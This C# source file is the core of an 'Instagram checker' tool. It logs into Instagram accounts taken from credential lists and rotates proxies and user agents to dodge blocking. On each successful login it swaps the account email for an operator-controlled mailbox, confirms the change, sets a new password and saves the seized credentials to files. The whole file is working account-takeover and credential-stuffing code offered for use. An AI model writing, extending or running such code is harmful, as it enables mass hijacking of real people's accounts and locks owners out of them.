using FileLibrary;
using InstagramLibrary;
using InstagramLibrary.Model;
using InstaLog;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace Instagram_Checker.BLL
{
    public class Model
    {
        public object[] locker = new object[1];

        private Proxy _proxy;
        private Accounts _account;
        private AccountsMail _accMails;
        private FileWorker _fileWorker;
        private UserAgents _agents;

        LogIO.Logging logging = new LogIO.Logging(LogIO.WriteLog);

        private List<string> _proxyHrefs;
        private int _threadCount;

        public bool IsProgramComplitlyEnded { get; private set; }
        public bool IsAccountInited { get; private set; }
        public bool IsObjectsReady { get; private set; }
        public bool IsAgentsInited { get; private set; }
        public bool IsProxyInited { get; private set; }
        public bool IsMailsReady { get; private set; }
        public int ProxySwitched { get; private set; }
        public int ProxyBlocked { get; private set; }
        public int AccsSwitched { get; private set; }
        public int AccsBlocked { get; private set; }

        private bool _noMoreProxy;

        public List<string> AccountInfoDataSet_Required { get; private set; }
        public List<string> AccountInfoDataSet_Success { get; private set; }

        List<Dictionary<string, object>> _deleteProxy;

        public Proxy GetProxy { get { return _proxy; } }
        public Accounts GetAccounts { get { return _account; } }
        public AccountsMail GetAccountsMail { get { return _accMails; } }
        public UserAgents GetUserAgents { get { return _agents; } }

        public Model()
        {
            AccsBlocked = 0;
            ProxyBlocked = 0;
            AccsSwitched = 0;
            ProxySwitched = 0;
            IsMailsReady = false;
            IsProxyInited = false;
            IsObjectsReady = false;
            IsAgentsInited = false;
            IsAccountInited = false;
            IsProgramComplitlyEnded = false;
            AccountInfoDataSet_Success = new List<string>();
            AccountInfoDataSet_Required = new List<string>();

            _noMoreProxy = true;
            _deleteProxy = new List<Dictionary<string, object>>();

            _proxy = new Proxy();
            _account = new Accounts();
            _accMails = new AccountsMail();
            _fileWorker = new FileWorker();
            _agents = new UserAgents();
        }

        public void InitAgents()
        {
            Task.Run(() =>
            {
                _agents.GetAccountsFromBaseFile();
                while (true)
                {
                    if (_agents.AgentsReady)
                        break;
                }
                lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Agents inited! {_agents.CountAgents} agents are ready", Method = "Model.InitAgents" });
                IsAgentsInited = true;
            });

        }

        public void InitAccounts()
        {
            Task.Run(() =>
            {
                _account.GetAccountsFromBaseFile();
                while (!_account.UsersReady) { }

                lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Accounts inited! {_account.CountUsers} accounts are ready", Method = "Model.InitAccounts" });
                IsAccountInited = true;
            });
        }

        public void InitProxy(bool isApiNeed, List<string> hrefs = null)
        {
            if (isApiNeed == true)
                _proxyHrefs = hrefs;

            Task.Run(() =>
                {
                    if (isApiNeed)
                        _proxy.GetRefProxy(hrefs);

                    _proxy.GetAllInfoFromFile();
                    _proxy.InstaProxy_Init();
                    _proxy.MailProxy_Init();
                    while (!_proxy.IsProxyReady) { }

                    lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Proxy inited! {_proxy.CountProxy} proxies are ready", Method = "Model.InitProxy" });
                    IsProxyInited = true;
                });
        }

        public void InitAccountsMail()
        {
            Task.Run(() =>
            {
                _accMails.GetMailsFromBaseFile();
                while (!_accMails.MailsReady) { }
                IsMailsReady = true;
            });
        }

        public void UpdateProxy()
        {
            _proxy.IsProxyReady = false;
            if (_proxyHrefs != null)
                if (_proxyHrefs.Count > 0)
                {
                    Task.Run(() =>
                    {
                        _proxy.GetRefProxy(_proxyHrefs);
                        _noMoreProxy = true;
                    });
                }

            _proxy.GetAllInfoFromFile();
            _proxy.ResolveProxy(_accMails.CountMails);
        }


        public void CheckAllAccounts(int countThreads)
        {
            _proxy.ResolveProxy(_accMails.CountMails);
            while (_proxy.CountProxy < countThreads * 25 + _accMails.CountMails)
            {
                UpdateProxy();
                while (!_proxy.IsProxyReady) { }
            }

            BackgroundWorker deleteWorker = new BackgroundWorker();
            deleteWorker.DoWork += DeleteAccounts_DoWork;
            deleteWorker.RunWorkerAsync();

            BackgroundWorker mailDeleteWorker = new BackgroundWorker();
            mailDeleteWorker.DoWork += DeleteMails_DoWork;
            mailDeleteWorker.RunWorkerAsync();


            for (int i = 0; i < countThreads; i++)
            {
                BackgroundWorker worker = new BackgroundWorker();
                worker.DoWork += CheckInsta_DoWork;
                worker.RunWorkerAsync();
                _threadCount++;
            }

            BackgroundWorker checkThreads = new BackgroundWorker();
            checkThreads.DoWork += CheckThreads_DoWork;
            checkThreads.RunWorkerAsync();
        }



        #region AsyncMethods
        private async void CheckInsta_DoWork(object sender, DoWorkEventArgs e)
        {
            List<Dictionary<string, object>> proxyOptions = new List<Dictionary<string, object>>();

            int checkPos = 0;
            bool threadIsWorking = true;
            int tryToFindCookies0 = 0;
            while ((!_account.AllPathChecked) || _account.CountUsers != 0)
            {
                int proxyPos = 0;
                for (int j = 0; j < 25; j++)
                {
                    try
                    {
                        if (_deleteProxy.Contains(_proxy.InstaProxies[0]))
                        {
                            lock (_proxy.locker)
                            {
                                _proxy.InstaProxies.Remove(_proxy.InstaProxies[0]);
                                j--;
                                continue;
                            }
                        }
                        lock (_proxy.locker)
                        {
                            proxyOptions.Add(_proxy.InstaProxies[0]);
                            _proxy.InstaProxies.Remove(_proxy.InstaProxies[0]);
                        }
                    }
                    catch
                    {
                        if (_noMoreProxy == true)
                        {
                            _noMoreProxy = false;
                            lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = "Last 500 proxy!", UserName = null, Method = "Model.CheckInsta" });
                            UpdateProxy();
                            while (!_proxy.IsProxyReady) { }
                            _noMoreProxy = true;
                        }
                    }
                }

                int i_position = -1;
                string instaLogin = null, instaPassword = null;
                for (int i = 0; i < 225; i++)
                {
                    if (proxyOptions.Count == 0)
                        break;

                    Dictionary<string, object> valueProxy = proxyOptions[Randomer.Next(0, proxyOptions.Count)];

                    lock (_account.locker)
                        if (_account.CountUsers <= 500 && !_account.AllPathChecked)
                        {
                            _account.SetUser();
                        }
                    if (i_position != i)
                        try
                        {
                            i_position = i;
                            tryToFindCookies0 = 0;
                            Dictionary<string, string> tempAcc;
                            lock (_account.locker)
                            {
                                tempAcc = _account.Users[Randomer.Next(0, _account.CountUsers)];
                            }
                            instaLogin = tempAcc["instaLogin"];
                            instaPassword = tempAcc["instaPassword"];
                            while (_account.UsersForDeleting.Contains(instaLogin + ":" + instaPassword))
                            {
                                lock (_account.locker)
                                {
                                    tempAcc = _account.Users[Randomer.Next(0, _account.CountUsers)];
                                }
                                instaLogin = tempAcc["instaLogin"];
                                instaPassword = tempAcc["instaPassword"];
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine(ex.Message);
                            threadIsWorking = false;
                            break;
                        }

                    bool check = true;
                    HttpAndroid android;
                    try
                    {
                        string agent;
                        lock (_agents.locker) agent = _agents.Agents[Randomer.Next(0, _agents.CountAgents)];

                        android = new HttpAndroid(instaLogin, instaPassword, valueProxy, agent);
                        var loggedIn = await android.LogIn();
                        if (loggedIn == null)
                        {
                            if (tryToFindCookies0 == 1)
                            {
                                proxyPos++;
                                checkPos = 0;
                                lock (locker) ProxySwitched++;
                            }
                            else if (tryToFindCookies0 == 2)
                            {
                                i++;
                                lock (_account.locker) { _account.UsersForDeleting.Add(instaLogin + ":" + instaPassword); }
                                lock (locker) AccsSwitched++;
                                tryToFindCookies0 = -1;
                                lock (locker) AccsBlocked++;
                            }
                            i--;
                            tryToFindCookies0++;
                            continue;
                        }

                        if (loggedIn.status == "success")
                        {
                            ProfileResult profile = await android.GetProfile();
                            if (profile != null) //means that account is logined
                            {
                                int randomPosition = Randomer.Next(0, _accMails.CountMails);
                                var resMail = _accMails.Mails[randomPosition];
                                _accMails.Mails.Remove(_accMails.Mails[randomPosition]);
                                _accMails.MailsForDeleting.Add(resMail["mailLogin"] + ":" + resMail["mailPassword"]);

                                string writePassword = instaPassword;

                                DateTime time = DateTime.Now;
                                Thread.Sleep(3000);
                                UpdateProfileResult updateStatus = await android.UpdateProfile(profile, resMail["mailLogin"]);

                                if (updateStatus.status == "ok")
                                {
                                    bool confirmed = true;
                                    string path = null;
                                    try
                                    {
                                        Mail mailClient = new Mail(resMail["mailLogin"], resMail["mailPassword"]);
                                        Thread.Sleep(1000);
                                        path = mailClient.GetMailPath(time);
                                        Thread.Sleep(1000);
                                        if (_proxy.MailProxies.Count > 0)
                                            confirmed = android.ConfirmMail(path, _proxy.MailProxies[Randomer.Next(0, _proxy.MailProxies.Count)]);
                                        else
                                            confirmed = android.ConfirmMail(path, valueProxy);
                                    }
                                    catch
                                    {
                                        lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = $"Email not confirmed: {resMail["mailLogin"]}:{resMail["mailPassword"]}", Method = "Model.CheckInsta", UserName = null });
                                        confirmed = false;
                                    }


                                    string newPass = Generator.GeneratePassword();
                                    PasswordChangeResult passResult = await android.ChangePassword(newPass);
                                    if (passResult.status == "ok")
                                        writePassword = newPass;
                                    else
                                        lock (_fileWorker.locker) _fileWorker.BadPass($"{profile.form_data.username}:{instaPassword}");


                                    if (confirmed)
                                    {
                                        string goodValidResult = profile.form_data.username + ":" + writePassword + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                        AccountInfoDataSet_Success.Add(goodValidResult);
                                        lock (LogIO.locker) logging.Invoke(LogIO.easyPath, new Log()
                                        {
                                            UserName = $"{profile.form_data.username}:{writePassword}",
                                            Date = DateTime.Now,
                                            LogMessage = "Good Valid",
                                            Method = "Model.CheckInsta"
                                        });
                                        lock (_fileWorker.locker) _fileWorker.GoodValid(goodValidResult);
                                    }
                                    else
                                    {
                                        string mailNotConfirmedResult = profile.form_data.username + ":" + writePassword + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                        AccountInfoDataSet_Success.Add(mailNotConfirmedResult);
                                        lock (LogIO.locker) logging.Invoke(LogIO.easyPath, new Log()
                                        {
                                            UserName = $"{profile.form_data.username}:{writePassword}",
                                            Date = DateTime.Now,
                                            LogMessage = $"Mail have troubles. Account not confirmed, but mail changed",
                                            Method = "Model.CheckInsta"
                                        });
                                        lock (_fileWorker.locker) _fileWorker.BadMail(mailNotConfirmedResult);
                                    }
                                }
                                else
                                {
                                    string account = instaLogin + ":" + writePassword;
                                    var checkProfile = await android.GetProfile();
                                    if (profile.form_data.email == checkProfile.form_data.email && !String.IsNullOrEmpty(checkProfile.form_data.phone_number))
                                    {
                                        account += ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                        lock (_fileWorker.locker) _fileWorker.BadValid(account);

                                    }
                                    else if (profile.form_data.email == checkProfile.form_data.email)
                                    {
                                        lock (_fileWorker.locker) _fileWorker.BadMail(account);
                                    }
                                }
                            }
                        }
                        else if (loggedIn.status == "checkpoint_required")//means that account is required
                        {
                            string account = $"{instaLogin}:{instaPassword}";
                            lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {account}", Method = "Model.CheckInsta" });
                            lock (LogIO.locker) logging.Invoke(LogIO.easyPath, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {account}", Method = "Model.CheckInsta" });

                            lock (locker)
                            {
                                AccountInfoDataSet_Required.Add(account);
                            }
                            lock (_fileWorker.locker)
                            {
                                _fileWorker.Checkpoint(account);
                            }
                        }
                        else if (loggedIn.status == "Request Timeout")
                        {
                            i--;
                            check = false;
                        }
                        else
                        {
                            lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Bad Credentials", Method = "Model.CheckInsta" });
                        }
                    }
                    catch (Exception ex)
                    {
                        if (ex.Message == "Невозможно соединиться с удаленным сервером" || ex.Message == "Unable to connect to the remote server")
                        {
                            Debug.WriteLine("Remote Server");
                            lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Unable to connect to remote server! Switch proxy", Method = "Model.CheckInsta" });
                            lock (locker) ProxyBlocked++;
                            lock (locker) _deleteProxy.Add(valueProxy);
                            lock (locker) ProxySwitched++;
                            proxyOptions.Remove(valueProxy);
                            checkPos = 0;
                            proxyPos++;
                        }
                        else if (ex.Message.Contains("400") || ex.Message.Contains("403"))
                        {
                            lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Exception 400! Bad request! Switch proxy", Method = "Model.CheckInsta" });
                            lock (locker) ProxyBlocked++;
                            lock (locker) _deleteProxy.Add(valueProxy);
                            lock (locker) ProxySwitched++;
                            proxyOptions.Remove(valueProxy);
                            checkPos = 0;
                            proxyPos++;
                        }
                        else
                        {
                            lock (LogIO.locker) logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Exception! {ex.Message} -- {ex.Source}", Method = "Model.CheckInsta" });
                        }

                        i--;
                        check = false;
                    }
                    if (check)
                    {
                        lock (_account.locker) { _account.UsersForDeleting.Add(instaLogin + ":" + instaPassword); }
                        lock (locker) AccsSwitched++;
                    }

                    checkPos++;
                    if (checkPos % 10 == 0)
                    {
                        lock (locker) ProxySwitched++;
                        proxyPos++;
                    }
                }
                proxyOptions.Clear();

                if (!threadIsWorking)
                    break;
            }
            _threadCount--;
        }

        private void DeleteAccounts_DoWork(object sender, DoWorkEventArgs e)
        {
            while (!IsProgramComplitlyEnded)
            {
                Thread.Sleep(300000);
                lock (_account.locker)
                {
                    _account.DeleteAccountsFromFile();
                }
            }
        }

        private void DeleteMails_DoWork(object sender, DoWorkEventArgs e)
        {
            while (!IsProgramComplitlyEnded)
            {
                Thread.Sleep(600000);
                lock (_accMails.locker)
                {
                    _accMails.DeleteMailFromFile();
                }
            }
        }


        private void CheckThreads_DoWork(object sender, DoWorkEventArgs e)
        {
            while (_threadCount > 0)
            {
                Thread.Sleep(5000);
            }
            IsProgramComplitlyEnded = true;
        }
        #endregion
    }
}
